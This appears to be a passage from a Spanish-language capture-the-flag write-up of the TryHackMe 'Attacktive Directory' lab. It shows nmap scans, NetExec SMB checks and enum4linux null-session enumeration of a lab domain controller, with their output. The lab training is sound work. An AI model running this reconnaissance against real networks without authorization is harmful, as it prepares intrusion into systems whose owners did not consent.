
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../attackingkerberos/">
      
      
        <link rel="next" href="../basicpentesting/">
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>Attacktive Directory - rdrg0x</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#attacktive-directory" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            rdrg0x
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Attacktive Directory
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    rdrg0x
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Writeups
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Writeups
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HackTheBox/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    HackTheBox
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    TryHackme
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    TryHackme
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../alfred/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Alfred
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADBasicEnum/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AD Basic Enumeration
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../anthem/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Anthem
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../atlas/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Atlas
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attackingkerberos/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Attacking kerberos
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Attacktive Directory
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Attacktive Directory
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Nmap
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      
        SMB
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerbrute" class="md-nav__link">
    <span class="md-ellipsis">
      
        kerbrute
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="kerbrute">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#asreproasting" class="md-nav__link">
    <span class="md-ellipsis">
      
        ASReproasting
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bloodhoud" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bloodhoud
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    <span class="md-ellipsis">
      
        impacket
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../basicpentesting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Basic Pentesting
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blaster/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blaster
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blog/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blog
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blue/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blue
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blueprint/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blueprint
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bolt/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Bolt
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../brainpan/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Brainpan
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../brainstorm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Brainstorm
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../chillhack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Chill Hack
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tags/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Tags
  

    
  </span>
  
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Nmap
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      
        SMB
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerbrute" class="md-nav__link">
    <span class="md-ellipsis">
      
        kerbrute
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="kerbrute">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#asreproasting" class="md-nav__link">
    <span class="md-ellipsis">
      
        ASReproasting
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bloodhoud" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bloodhoud
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    <span class="md-ellipsis">
      
        impacket
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="Navigation" >
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../.." class="md-path__link">
        
  <span class="md-ellipsis">
    Home
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../../HackTheBox/" class="md-path__link">
          
  <span class="md-ellipsis">
    Writeups
  </span>

        </a>
      </li>
    
  

      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../alfred/" class="md-path__link">
          
  <span class="md-ellipsis">
    TryHackme
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  

  <nav class="md-tags" >
    
      
      
      
      
        <a href="../../tags/#tag:active-directory" class="md-tag">active-directory</a>
      
    
      
      
      
      
        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
      
    
      
      
      
      
        <a href="../../tags/#tag:windows" class="md-tag">windows</a>
      
    
  </nav>



<h1 id="attacktive-directory">Attacktive Directory<a class="headerlink" href="#attacktive-directory" title="Permanent link">&para;</a></h1>
<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>-oN<span class="w"> </span>allPorts.txt

PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE
<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain
<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http
<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec
<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc
<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn
<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap
<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds
<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5
<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>http-rpc-epmap
<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldapssl
<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAP
<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAPssl
<span class="m">3389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ms-wbt-server
<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>wsman
<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>adws
<span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>winrm
<span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49668</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49672</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49674</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49678</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49689</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49699</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
</code></pre></div>
<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sC<span class="w"> </span>-p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49672,49673,49674,49678,49689,49699<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>-oN<span class="w"> </span>target.txt

PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE
<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain
<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http
<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
<span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec
<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc
<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn
<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap
<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds
<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5
<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>http-rpc-epmap
<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldapssl
<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAP
<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAPssl
<span class="m">3389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ms-wbt-server
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>AttacktiveDirectory.spookysec.local
<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-10-03T19:56:34
<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-04-04T19:56:34
<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>THM-AD
<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>THM-AD
<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>ATTACKTIVEDIREC
<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>spookysec.local
<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>AttacktiveDirectory.spookysec.local
<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.17763
<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-10-04T20:00:22+00:00
<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-04T20:00:20+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>wsman
<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>adws
<span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>winrm
<span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49668</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49672</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49674</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49678</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49689</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown
<span class="m">49699</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown

Host<span class="w"> </span>script<span class="w"> </span>results:
<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-10-04T20:00:22
<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
</code></pre></div>
<h3 id="smb">SMB<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w">                                                                                                                                                      </span>
SMB<span class="w">         </span><span class="m">10</span>.201.117.151<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:spookysec.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span><span class="w"> </span>
</code></pre></div>
<p>Agregamos al etc/hosts los resultados de hosts</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>--generate-hosts-file<span class="w"> </span>hosts

<span class="m">10</span>.201.117.151<span class="w">     </span>ATTACKTIVEDIREC.spookysec.local<span class="w"> </span>spookysec.local<span class="w"> </span>ATTACKTIVEDIREC
</code></pre></div>
<div class="highlight"><pre><span></span><code>enum4linux<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>&gt;<span class="w"> </span>EnumSBM.txt

cat<span class="w"> </span>EnumSBM.txt<span class="w"> </span>
Starting<span class="w"> </span>enum4linux<span class="w"> </span>v0.9.1<span class="w"> </span><span class="o">(</span><span class="w"> </span>http://labs.portcullis.co.uk/application/enum4linux/<span class="w"> </span><span class="o">)</span><span class="w"> </span>on<span class="w"> </span>Sat<span class="w"> </span>Oct<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">17</span>:13:15<span class="w"> </span><span class="nv">2025</span>

<span class="w"> </span><span class="o">=========================================(</span><span class="w"> </span>Target<span class="w"> </span>Information<span class="w"> </span><span class="o">)=========================================</span>

Target<span class="w"> </span>...........<span class="w"> </span><span class="m">10</span>.201.117.151
RID<span class="w"> </span>Range<span class="w"> </span>........<span class="w"> </span><span class="m">500</span>-550,1000-1050
Username<span class="w"> </span>.........<span class="w"> </span><span class="s1">&#39;&#39;</span>
Password<span class="w"> </span>.........<span class="w"> </span><span class="s1">&#39;&#39;</span>
Known<span class="w"> </span>Usernames<span class="w"> </span>..<span class="w"> </span>administrator,<span class="w"> </span>guest,<span class="w"> </span>krbtgt,<span class="w"> </span>domain<span class="w"> </span>admins,<span class="w"> </span>root,<span class="w"> </span>bin,<span class="w"> </span><span class="nv">none</span>


<span class="w"> </span><span class="o">===========================(</span><span class="w"> </span>Enumerating<span class="w"> </span>Workgroup/Domain<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)===========================</span>


<span class="o">[</span>E<span class="o">]</span><span class="w"> </span>Can<span class="w"> </span>t<span class="w"> </span>find<span class="w"> </span>workgroup/domain



<span class="w"> </span><span class="o">===============================(</span><span class="w"> </span>Nbtstat<span class="w"> </span>Information<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)===============================</span>

Looking<span class="w"> </span>up<span class="w"> </span>status<span class="w"> </span>of<span class="w"> </span><span class="m">10</span>.201.117.151
No<span class="w"> </span>reply<span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.201.117.151

<span class="w"> </span><span class="o">==================================(</span><span class="w"> </span>Session<span class="w"> </span>Check<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)==================================</span>


<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>allows<span class="w"> </span>sessions<span class="w"> </span>using<span class="w"> </span>username<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span>password<span class="w"> </span><span class="s1">&#39;&#39;</span>


<span class="w"> </span><span class="o">===============================(</span><span class="w"> </span>Getting<span class="w"> </span>domain<span class="w"> </span>SID<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)===============================</span>

Domain<span class="w"> </span>Name:<span class="w"> </span>THM-AD
Domain<span class="w"> </span>Sid:<span class="w"> </span>S-1-5-21-3591857110-2884097990-301047963

